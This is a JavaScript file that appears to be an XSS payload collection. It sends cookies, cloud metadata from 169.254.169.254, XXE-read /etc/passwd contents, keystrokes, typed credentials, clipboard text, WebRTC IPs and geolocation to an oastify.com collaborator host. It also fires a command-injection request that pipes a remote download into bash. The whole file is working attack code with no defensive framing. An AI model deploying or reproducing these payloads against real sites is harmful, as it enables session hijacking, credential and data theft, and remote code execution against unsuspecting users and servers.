// Alert current domain
alert("Domain: " + document.domain);

// Steal cookies and send to attacker server
var cookies = document.cookie;
var burpCollaboratorURL = "http://211lsn02jww8lqws1pj8dml4rvxmleq2f.oastify.com";
var img = new Image();
img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);

// Fetch internal cloud metadata (SSRF)
fetch('http://169.254.169.254/latest/meta-data/')
.then(response => response.text())
.then(data => fetch(burpCollaboratorURL + "/?metadata=" + encodeURIComponent(data)));

// Inject iframe to scan internal network
var iframe = document.createElement('iframe');
iframe.src = "http://localhost:8080/admin";
document.body.appendChild(iframe);

// Exploit XXE by sending malicious XML
var payload = `<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`;
fetch("/upload", { method: "POST", body: payload, headers: { "Content-Type": "application/xml" } })
.then(response => response.text())
.then(data => fetch(burpCollaboratorURL + "/?xxe=" + encodeURIComponent(data)));

// Force blind SSRF via image loading
var img = new Image();
img.src = "http://internal-service.local/?test=1";

// RCE via vulnerable command injection endpoint
fetch('/admin?cmd=' + encodeURIComponent('curl http://211lsn02jww8lqws1pj8dml4rvxmleq2f.oastify.com | bash'));

// Keylogging attack
document.addEventListener('keydown', function(e) {
    fetch(burpCollaboratorURL + "/?keylog=" + e.key);
});

// Redirect users to phishing page
window.location.href = "https://bing.com/";

// WebRTC IP Leak
var peer = new RTCPeerConnection({iceServers:[]});
peer.createDataChannel('');
peer.createOffer().then(o => peer.setLocalDescription(o));
peer.onicecandidate = e => {
    if (e && e.candidate) {
        fetch(burpCollaboratorURL + "/?ip=" + encodeURIComponent(e.candidate.candidate));
    }
};

// Steal user credentials from input fields
setInterval(() => {
    var inputs = document.querySelectorAll('input[type="password"], input[type="text"]');
    inputs.forEach(input => {
        if (input.value.length > 0) {
            fetch(burpCollaboratorURL + "/?creds=" + encodeURIComponent(input.value));
        }
    });
}, 5000);

// Clipboard data theft
document.addEventListener("paste", (event) => {
    var clipboardData = event.clipboardData.getData("text");
    fetch(burpCollaboratorURL + "/?clipboard=" + encodeURIComponent(clipboardData));
});

// Exploit HTML5 geolocation to steal user's location
navigator.geolocation.getCurrentPosition((position) => {
    fetch(burpCollaboratorURL + "/?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
});
